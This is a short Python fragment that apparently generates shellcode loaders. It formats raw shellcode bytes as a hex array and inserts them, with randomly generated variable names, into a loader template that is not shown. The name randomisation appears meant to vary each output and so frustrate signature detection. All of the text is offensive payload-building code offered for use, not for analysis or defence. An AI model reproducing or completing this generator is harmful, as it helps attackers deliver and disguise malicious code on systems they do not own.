def random_string():
    rstring = ""
    alphabet = string.ascii_lowercase + string.ascii_uppercase

    for _ in range(0, 10):
        rstring += random.choice(alphabet)

    return rstring

def format_shellcode(shellcode):
    hshellcode = ""

    code_size = len(shellcode)

    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"

    return hshellcode

def generate(raw_shellcode):
    windef = random_string()
    wintype = random_string()
    shellcode = random_string()
    baseaddr = random_string()

    hex_shellcode = format_shellcode(raw_shellcode)

    return TEMPLATE % (windef, wintype, windef, shellcode,
                       hex_shellcode, baseaddr, wintype, shellcode,
                       shellcode, baseaddr, shellcode, wintype,
                       baseaddr)